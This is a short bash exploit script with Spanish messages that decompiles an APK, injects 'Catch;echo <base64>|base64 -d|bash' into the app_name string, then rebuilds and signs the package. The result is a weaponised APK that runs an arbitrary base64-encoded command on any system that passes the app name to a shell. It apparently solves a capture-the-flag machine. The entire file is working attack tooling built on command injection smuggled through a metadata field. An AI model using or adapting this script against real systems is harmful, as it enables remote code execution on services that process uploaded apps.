#!/bin/bash

decode_apk() {
    rm -rf "$TMP_FOLDER"
    apktool d "$APK_FILE_NAME" -o "$TMP_FOLDER" 2>/dev/null > /dev/null

    APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$TMP_FOLDER/res/values/strings.xml")
    sed -i "s/$APP_NAME/Catch;echo $COMMAND_TO_EXECUTE|base64 -d|bash/g" "$TMP_FOLDER/res/values/strings.xml"

    echo "[+] El APK se ha decompilado"
}

build_apk() {
#    rm -rf "$APK_FILE_NAME"
    apktool b "$TMP_FOLDER" 2>/dev/null > /dev/null
    mv "$TMP_FOLDER/dist/$APK_FILE_NAME" .

    rm -rf "$TMP_FOLDER"

    echo "[+] Se ha construido el nuevo APK"
}

sig_apk() {
    keytool -genkey -noprompt -keyalg RSA -keysize 2048 -validity 10000 \
     -dname "CN=Catch Global Systems, OU=NO, O=NO, L=NO, S=NO, C=NO" \
     -keystore "$KEY_STORE_NAME" \
     -storepass "$KEY_STORE_PASSWORD" \
     -keypass "$KEY_STORE_PASSWORD" \
     -alias "$KEY_STORE_ALIAS" 2>/dev/null > /dev/null

    echo "[+] Llave para firmar el APK generada"

    KEY_STORE_PATH="$(pwd)/$KEY_STORE_NAME"
    export KEY_STORE_PATH

    jarsigner -storepass "$KEY_STORE_PASSWORD" -sigalg SHA1withRSA -digestalg SHA1 -keystore "$KEY_STORE_PATH" "$APK_FILE_NAME" "$KEY_STORE_ALIAS" 2>/dev/null > /dev/null

    echo "[+] La APK ha sido firmada"

    unset KEY_STORE_PATH
    rm -rf "$KEY_STORE_NAME"
}

APK_FILE_NAME="catchv1.0.apk"
KEY_STORE_NAME="juguito_de_hackeito.keystore"
KEY_STORE_ALIAS="juguito"
KEY_STORE_PASSWORD="holahola"
TMP_FOLDER="tmp_apk_files"

if [ "$#" -eq 1 ]; then
    COMMAND_TO_EXECUTE="$(echo -n $1 | base64)"
    decode_apk
    build_apk
    sig_apk
else
    echo "Uso: $0 <COMMAND_TO_EXECUTE>"
    exit 1
fi